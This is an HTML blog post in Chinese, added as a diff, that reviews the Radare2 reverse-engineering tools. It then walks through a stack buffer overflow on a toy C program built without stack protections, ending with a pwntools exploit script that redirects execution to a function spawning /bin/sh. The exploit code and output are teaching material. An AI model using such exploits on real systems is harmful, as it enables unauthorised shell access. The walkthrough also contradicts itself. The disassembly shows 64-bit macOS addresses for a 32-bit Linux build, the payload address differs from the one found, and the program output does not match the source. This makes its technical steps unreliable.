@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Post4_Radare 使用记录 | Dashjay&#39;s</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <link rel="stylesheet" href="/css/fonts.css" />
+    <link rel="stylesheet" href="/css/theme-override.css">
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0-rc.1/dist/katex.min.css" integrity="sha384-D+9gmBxUQogRLqvARvNLmA9hS2x//eK1FhVb9PiU86gmcrBrJAQT8okdJ4LMp2uv" crossorigin="anonymous">
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0-rc.1/dist/katex.min.js" integrity="sha384-483A6DwYfKeDa0Q52fJmxFXkcPCFfnXMoXblOkJ4JcA8zATN6Tm78UNL72AKk+0O" crossorigin="anonymous"></script>
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0-rc.1/dist/contrib/auto-render.min.js" integrity="sha384-yACMu8JWxKzSp/C1YV86pzGiQ/l1YUfE8oPuahJQxzehAjEt2GiQuy/BIvl9KyeF" crossorigin="anonymous"></script>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            renderMathInElement(document.body);
+        });
+    </script>
+
+<header>
+
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script>
+  <nav>
+    <ul>
+      
+      
+      <li class="pull-left ">
+        <a href="/">/home/dashjay&#39;s</a>
+      </li>
+      
+      
+      <li class="pull-left ">
+        <a href="/">~/home</a>
+      </li>
+      
+      
+      <li class="pull-left ">
+        <a href="/categories/">~/categories</a>
+      </li>
+      
+      
+      <li class="pull-left ">
+        <a href="/tags/">~/tags</a>
+      </li>
+      
+
+      
+      
+      <li class="pull-right">
+        <a href="/index.xml">~/subscribe</a>
+      </li>
+      
+
+    </ul>
+  </nav>
+</header>
+
+  </head>
+
+  <body>
+    <br/>
+
+<div class="article-meta">
+<h1><span class="title">Post4_Radare 使用记录</span></h1>
+<h2 class="author">dashjay</h2>
+<h2 class="date">2019/12/11</h2>
+<p class="terms">
+  
+  
+  
+  
+  
+</p>
+</div>
+
+
+
+<main>
+<p>[toc]</p>
+<h2 id="4">报告4</h2>
+<p>选择产品：Radare2取证工具</p>
+<h4 id="heading">工具介绍</h4>
+<p><a href="https://github.com/radare/radare2"><strong>Radare</strong></a>是一个取证工具以及可编写脚本的命令行十六进制编辑器，可以打开磁盘文件、支持分析二进制、反汇编代码、调试程序以及连接到远程gdb服务服务器的功能，我记得我高中的时候这工具曾进过Github TOP 30，但是由于各种原因，我们平时都使用GDB，也就忽略了这个工具，看到它被定义为取证工具的时候我有点好奇，什么是计算机取证&hellip;&hellip;..下面贴一下man手册中r2的描述</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
+RADARE2<span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>                BSD General Commands Manual               RADARE2<span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>
+
+NAME
+     radare2 -- Advanced commandline hexadecimal editor, disassembler and
+     debugger
+</code></pre></div><h4 id="heading-1">功能测试</h4>
+<p>众所周知GDB可以运行时（runtime）分析，但是R2只是一个静态分析的软件，让我来看看他有多强大，先分析一小段代码看看。</p>
+<p>这个软件集成了许多小工具，看来平时写python小工具的时代结束了，这么多附带的小工具我来介绍下。</p>
+<h5 id="rax2-----------">rax2 &mdash;&mdash;&mdash;&gt; 用于数值转换</h5>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$rax2 -s <span style="color:#ae81ff">414141</span>
+AAAA%
+</code></pre></div><p>看下man手册介绍</p>
+<pre><code>
+RAX2(1)                   BSD General Commands Manual                  RAX2(1)
+
+NAME
+     rax2 -- radare base converter
+DESCRIPTION
+     This command is part of the radare project.
+     
+     This command allows you to convert values between positive and negative integer, float, octal, binary and hexadecimal values.
+</code></pre><p>这个小工具可以正负，整数，浮点数，十进制，二进制，十六进制等之间相互转换。</p>
+<h5 id="rasm2---------">rasm2 &mdash;&mdash;-&gt; 反汇编和汇编</h5>
+<h5 id="rabin2---------">rabin2 &mdash;&mdash;-&gt; 查看文件格式(其实我就只是用来看字符串)</h5>
+<p>有时候用这种方法可以快速获得flag，我说的是签到题。</p>
+<p>以下是使用命令查看二进制文件中的字符串</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ae81ff">2017</span> ◯ : rabin2 -zz forkc | grep <span style="color:#e6db74">&#34;TEXT.&#34;</span>
+<span style="color:#ae81ff">022</span> 0x00000ed2 0x100000ed2   <span style="color:#ae81ff">4</span>   <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>0.__TEXT.__text<span style="color:#f92672">)</span>  utf8 1<span style="color:#ae81ff">\t</span>ǉE blocks<span style="color:#f92672">=</span>Basic Latin,Latin Extended-B
+<span style="color:#ae81ff">023</span> 0x00000f7c 0x100000f7c  <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">14</span> <span style="color:#f92672">(</span>3.__TEXT.__cstring<span style="color:#f92672">)</span> ascii my pid is %d<span style="color:#ae81ff">\n</span>
+<span style="color:#ae81ff">024</span> 0x00000f8a 0x100000f8a  <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">12</span> <span style="color:#f92672">(</span>3.__TEXT.__cstring<span style="color:#f92672">)</span> ascii fork failed
+<span style="color:#ae81ff">025</span> 0x00000f96 0x100000f96   <span style="color:#ae81ff">7</span>   <span style="color:#ae81ff">8</span> <span style="color:#f92672">(</span>3.__TEXT.__cstring<span style="color:#f92672">)</span> ascii /bin/ps
+<span style="color:#ae81ff">026</span> 0x00000fa1 0x100000fa1  <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">15</span> <span style="color:#f92672">(</span>3.__TEXT.__cstring<span style="color:#f92672">)</span> ascii child complete
+</code></pre></div><h5 id="radiff2---------diff">radiff2 &mdash;&mdash;&gt; 对文件进行 diff</h5>
+<h5 id="ragg2ragg2">ragg2/ragg2�cc &mdash;&mdash;&gt; 用于更方便的生成shellcode</h5>
+<h5 id="rahash2---------hash">rahash2 &mdash;&mdash;&gt; 各种密码算法， hash算法</h5>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$rahash2 -s I_LOVE_OUC -j
+<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;sha256&#34;</span>,<span style="color:#e6db74">&#34;hash&#34;</span>:<span style="color:#e6db74">&#34;0417b096e02a7c452bd7e9d0b4ff0b3322edf4b4b8e3eb434a9d9a072aa1c21c&#34;</span><span style="color:#f92672">}</span>%
+</code></pre></div><p>以上工具都是他附带的一些工具，最主要的程序叫做Radare2，是一个反汇编，的静态分析的神器。使用这个工具的原因一方面是自己能力不足，另一方面是CTF做题真的是来不及，使用这个程序可以大大的提高我在做题的时候的的速度和正确性</p>
+<h3 id="radare2">Radare2</h3>
+<p>为了展示这个程序的厉害我从网上看到了一个小实验，上一段代码</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#</span><span style="color:#75715e">include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span><span style="color:#75715e">#</span><span style="color:#75715e">include</span><span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">pwn</span>(){
+    system(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#e6db74">&#34;</span>);
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vulnerable</span>(){
+    <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">32</span>];
+    gets(buffer);
+    <span style="color:#66d9ef">return</span>;
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
+    vulnerable();
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>按照常理来将，<code>/bin/sh</code>是不会被执行的，但是，并且编译出结果的我们本身是无法知道源代码的，这时候可以使用r2来汇编码</p>
+<p><code>&gt; sudo gcc -o a buffer.c -no-pie -m32 -fno-stack-protector </code></p>
+<blockquote>
+<p>首先我先使用管理员权限编译这个代码，这里使用sudo只是为了将生成的目标文件的owner设置为root,当你以普通身份提权后可是获得root权限</p>
+</blockquote>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">root<span style="color:#960050;background-color:#1e0010">@</span>Aurora:<span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>code<span style="color:#f92672">/</span>pwn<span style="color:#f92672">/</span>challenge<span style="color:#f92672">/</span><span style="color:#ae81ff">1</span> <span style="color:#960050;background-color:#1e0010">#</span> sudo gcc <span style="color:#f92672">-</span>o a buffer.c <span style="color:#f92672">-</span>no<span style="color:#f92672">-</span>pie <span style="color:#f92672">-</span>m32 <span style="color:#f92672">-</span>fno<span style="color:#f92672">-</span>stack<span style="color:#f92672">-</span>protector 
+buffer.c: In function <span style="color:#960050;background-color:#1e0010">‘</span>vulnerable<span style="color:#960050;background-color:#1e0010">’</span><span style="color:#f92672">:</span>
+buffer.c:<span style="color:#ae81ff">14</span><span style="color:#f92672">:</span><span style="color:#ae81ff">5</span><span style="color:#f92672">:</span> warning: implicit declaration of function <span style="color:#960050;background-color:#1e0010">‘</span>gets<span style="color:#960050;background-color:#1e0010">’</span>; did you mean <span style="color:#960050;background-color:#1e0010">‘</span>fgets<span style="color:#960050;background-color:#1e0010">’</span><span style="color:#f92672">?</span> [<span style="color:#f92672">-</span>Wimplicit<span style="color:#f92672">-</span>function<span style="color:#f92672">-</span>declaration]
+     gets(buffer);
+     <span style="color:#f92672">^</span><span style="color:#f92672">~</span><span style="color:#f92672">~</span><span style="color:#f92672">~</span>
+     fgets
+<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>ld: <span style="color:#f92672">/</span>tmp<span style="color:#f92672">/</span>ccQDe6dj.o: in function <span style="color:#960050;background-color:#1e0010">`</span>vulnerable<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">:</span>
+buffer.c:(.text<span style="color:#f92672">+</span><span style="color:#ae81ff">0x97</span>)<span style="color:#f92672">:</span> <span style="color:#960050;background-color:#1e0010">警</span><span style="color:#960050;background-color:#1e0010">告</span><span style="color:#960050;background-color:#1e0010">：</span>the <span style="color:#960050;background-color:#1e0010">`</span>gets<span style="color:#960050;background-color:#1e0010">&#39;</span> function is dangerous and should not be used.
+</code></pre></div><p>可见gets本身是一个十分危险的函数,他不会检查字符串的长度,而是以回车来判断输入是否结束,及其容易引发栈溢出.</p>
+<p>  解释一下这几个参数的作用:</p>
+<ul>
+<li><code>-m32</code>:指的是生成32位程序</li>
+<li><code>-fno-stack-protector</code>:字面意思,关闭栈保护,不生成canary</li>
+<li><code>-no-pie</code>:关闭pie(Position Independent Executable),这个pie并不能吃,他使程序的地址被打乱,导致我们无法返回到固定目标地址.</li>
+</ul>
+<p>  你可以使用如下命令来运行它，并且按下5个a回车可以对程序进行全局分析，</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">&gt; r2 ./a
+<span style="color:#f92672">[</span>0x100000f60<span style="color:#f92672">]</span>&gt;aaaaa
+<span style="color:#f92672">[</span>x<span style="color:#f92672">]</span> Analyze all flags starting with sym. and entry0 <span style="color:#f92672">(</span>aa<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>x<span style="color:#f92672">]</span> Analyze <span style="color:#66d9ef">function</span> calls <span style="color:#f92672">(</span>aac<span style="color:#f92672">)</span>
+......
+<span style="color:#f92672">[</span>x<span style="color:#f92672">]</span> Finding <span style="color:#66d9ef">function</span> preludes
+<span style="color:#f92672">[</span>x<span style="color:#f92672">]</span> Enable constraint types analysis <span style="color:#66d9ef">for</span> variables
+</code></pre></div><p>使用&gt; s main可以跳转到main函数，没有变化因为，r2给程序找了默认入口[0x100000f60]</p>
+<pre><code>[0x100000f60]&gt;s main
+[0x100000f60]&gt;pdf
+</code></pre><p>下面我们来分析一下这个main()函数:</p>
+<p>编译成功后我们可以使用checksec工具检查编译生成的文件:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">root@Aurora:/home/code/pwn/challenge/1 <span style="color:#75715e"># checksec a</span> 
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/code/pwn/challenge/1/a&#39;</span>
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span style="color:#f92672">(</span>0x8048000<span style="color:#f92672">)</span>
+</code></pre></div><p>下面我们来分析一下这个main()函数:</p>
+<pre><code class="language-assembly" data-lang="assembly">┌ (fcn) entry0 28
+│   entry0 ();
+│           ; var int32_t var_4h @ rbp-0x4
+│           0x100000f60      55             push rbp
+│           0x100000f61      4889e5         mov rbp, rsp
+│           0x100000f64      4883ec10       sub rsp, 0x10
+│           0x100000f68      c745fc000000.  mov dword [var_4h], 0
+│           0x100000f6f      e8ccffffff     call sym._vuln
+│           0x100000f74      31c0           xor eax, eax
+│           0x100000f76      4883c410       add rsp, 0x10
+│           0x100000f7a      5d             pop rbp
+└           0x100000f7b      c3             ret
+
+</code></pre><p>可以看出这是在main函数中调用了vuln</p>
+<p>我们可以继续去看看vuln</p>
+<pre><code class="language-assembly" data-lang="assembly">   sym._vuln ();
+│           ; var char *var_28h @ rbp-0x28
+│           ; var char *s @ rbp-0x20
+│           ; CALL XREF from entry0 (0x100000f6f)
+│           0x100000f40      55             push rbp
+│           0x100000f41      4889e5         mov rbp, rsp
+│           0x100000f44      4883ec30       sub rsp, 0x30              ; '0'
+│           0x100000f48      488d7de0       lea rdi, [s]               ; char *s
+│           0x100000f4c      e82b000000     call sym.imp.gets          ; char *gets(char *s)
+│           0x100000f51      488945d8       mov qword [var_28h], rax
+│           0x100000f55      4883c430       add rsp, 0x30              ; '0'
+│           0x100000f59      5d             pop rbp
+└           0x100000f5a      c3             ret
+</code></pre><p>最关键的两行就是，这两行表示，把<code>*s</code>这个2*16字节的长度的字符串传入 rdi并且准备调用gets给他赋值</p>
+<pre><code class="language-assembly" data-lang="assembly">0x100000f48      488d7de0       lea rdi, [s]               ; char *s
+0x100000f4c      e82b000000     call sym.imp.gets          ; char *gets(char *s)
+</code></pre><p>栈结构画一下，就是这样的。</p>
+<pre><code class="language-assembly" data-lang="assembly">       																		 +-----------------+
+                                           |     retaddr     |
+                                           +-----------------+
+                                           |     saved ebp   |
+                                    ebp---&gt;+-----------------+
+                                           |                 |
+                                           |                 |
+                                           |                 |
+                                           |                 |
+                                           |                 |
+                                           |                 |
+                              s,ebp-0x28--&gt;+-----------------+
+</code></pre><p>看一下pwn的地址</p>
+<pre><code class="language-assembly" data-lang="assembly">            ;-- section.0.__TEXT.__text:
+            ;-- func.100000f20:
+┌ (fcn) sym._pwn 29
+│   sym._pwn ();
+│           ; var int32_t var_4h @ rbp-0x4
+│           0x100000f20      55             push rbp                   ; [00] -r-x section size 92 named 0.__TEXT.__text
+│           0x100000f21      4889e5         mov rbp, rsp
+</code></pre><p>发现是<code>0x100000f20</code></p>
+<p>假如我们输入的字符串为:<code>0x28 * 'a' 'bbbb' + pwn_addr</code>,那么由于gets只有读到回车才停,所以这一段字符串会把saved_ebp覆盖为bbbb,将ret_addr覆盖为pwn_addr,那么,此时栈的结构为:</p>
+<pre><code>                                           +-----------------+
+                                           |   0x100000f20   |
+                                           +-----------------+
+                                           |       bbbb      |
+                                    ebp---&gt;+-----------------+
+                                           |                 |
+                                           |                 |
+                                           |                 |
+                                           |                 |
+                                           |                 |
+                                           |                 |
+                              s,ebp-0x14--&gt;+-----------------+
+</code></pre><p>注:</p>
+<blockquote>
+<p>前面提到,在内存中,每个值按照字节存储.一般都是按照小端存储,所以0x100000f20 在内存中的形式为</p>
+</blockquote>
+<p><code>\x20\x0f\x00\x00\x01</code></p>
+<p>到这里radare2的任务已经完成了，但是我还是使用python脚本完成这个题目。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!	/usr/bin/python2</span>
+<span style="color:#75715e">#选择python2解释器</span>
+
+<span style="color:#75715e"># -*- coding: UTF-8 -*-</span>
+<span style="color:#75715e">#设置utf-8编码,为了支持中文</span>
+
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>  <span style="color:#75715e">#引入pwntools的库</span>
+
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">debug</span><span style="color:#e6db74">&#39;</span> <span style="color:#75715e"># 开启debug模式,可以记录发送和收到的字符串</span>
+
+sh <span style="color:#f92672">=</span> process(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./a</span><span style="color:#e6db74">&#39;</span>)  <span style="color:#75715e">#构造与程序交互的对象</span>
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">40</span> <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">bbbb</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x08049182</span>)  <span style="color:#75715e"># 构造payload</span>
+
+sh<span style="color:#f92672">.</span>sendline(payload)  <span style="color:#75715e"># 将字符串发送给程序</span>
+
+sh<span style="color:#f92672">.</span>interactive() <span style="color:#75715e"># 将代码变为手动交互</span>
+
+</code></pre></div><p>然后用python解释器运行这个脚本就可以完成pwn</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">root<span style="color:#a6e22e">@Aurora</span>:<span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>code<span style="color:#f92672">/</span>pwn<span style="color:#f92672">/</span>challenge<span style="color:#f92672">/</span><span style="color:#ae81ff">1</span> <span style="color:#75715e"># ./a.py</span>
+[<span style="color:#f92672">+</span>] Starting local process <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./a</span><span style="color:#e6db74">&#39;</span>: pid <span style="color:#ae81ff">10160</span>
+[DEBUG] Sent <span style="color:#ae81ff">0x31</span> bytes:
+    <span style="color:#ae81ff">00000000</span>  <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span>  <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span>  <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span>  <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span>  <span style="color:#960050;background-color:#1e0010">│</span>aaaa<span style="color:#960050;background-color:#1e0010">│</span>aaaa<span style="color:#960050;background-color:#1e0010">│</span>aaaa<span style="color:#960050;background-color:#1e0010">│</span>aaaa<span style="color:#960050;background-color:#1e0010">│</span>
+    <span style="color:#f92672">*</span>
+    <span style="color:#ae81ff">00000020</span>  <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span>  <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span>  <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">62</span>  <span style="color:#ae81ff">82</span> <span style="color:#ae81ff">91</span> <span style="color:#ae81ff">04</span> <span style="color:#ae81ff">08</span>  <span style="color:#960050;background-color:#1e0010">│</span>aaaa<span style="color:#960050;background-color:#1e0010">│</span>aaaa<span style="color:#960050;background-color:#1e0010">│</span>bbbb<span style="color:#960050;background-color:#1e0010">│</span><span style="color:#960050;background-color:#1e0010">·</span><span style="color:#960050;background-color:#1e0010">·</span><span style="color:#960050;background-color:#1e0010">·</span><span style="color:#960050;background-color:#1e0010">·</span><span style="color:#960050;background-color:#1e0010">│</span>
+    <span style="color:#ae81ff">00000030</span>  <span style="color:#ae81ff">0</span>a                                                  <span style="color:#960050;background-color:#1e0010">│</span><span style="color:#960050;background-color:#1e0010">·</span><span style="color:#960050;background-color:#1e0010">│</span>
+    <span style="color:#ae81ff">00000031</span>
+[<span style="color:#f92672">*</span>] Switching to interactive mode
+[DEBUG] Received <span style="color:#ae81ff">0x33</span> bytes:
+    <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Hello,I</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">m dyf.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+    <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
+    <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">QAQ</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
+    <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
+    <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Do you have something to say?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
+Hello,I<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">m dyf.</span>
+
+QAQ
+
+Do you have something to say<span style="color:#960050;background-color:#1e0010">?</span>
+<span style="color:#960050;background-color:#1e0010">$</span> 
+</code></pre></div><p>按照以往的传统，我们都会输入一句</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt;whoami
+room
+</code></pre></div><p>那么一次利用radare2的一次缓冲区溢出漏洞利用就完成了。</p>
+
+</main>
+
+    <footer>
+      
+<script>
+(function() {
+  function center_el(tagName) {
+    var tags = document.getElementsByTagName(tagName), i, tag;
+    for (i = 0; i < tags.length; i++) {
+      tag = tags[i];
+      var parent = tag.parentElement;
+      
+      if (parent.childNodes.length === 1) {
+        
+        if (parent.nodeName === 'A') {
+          parent = parent.parentElement;
+          if (parent.childNodes.length != 1) continue;
+        }
+        if (parent.nodeName === 'P') parent.style.textAlign = 'center';
+      }
+    }
+  }
+  var tagNames = ['img', 'embed', 'object'];
+  for (var i = 0; i < tagNames.length; i++) {
+    center_el(tagNames[i]);
+  }
+})();
+</script>
+
+      
+      <hr/>
+      Open-Source | <a href="https://github.com/goodroot/hugo-classic">Github</a>
+      
+    </footer>
+  </body>
+</html>
+
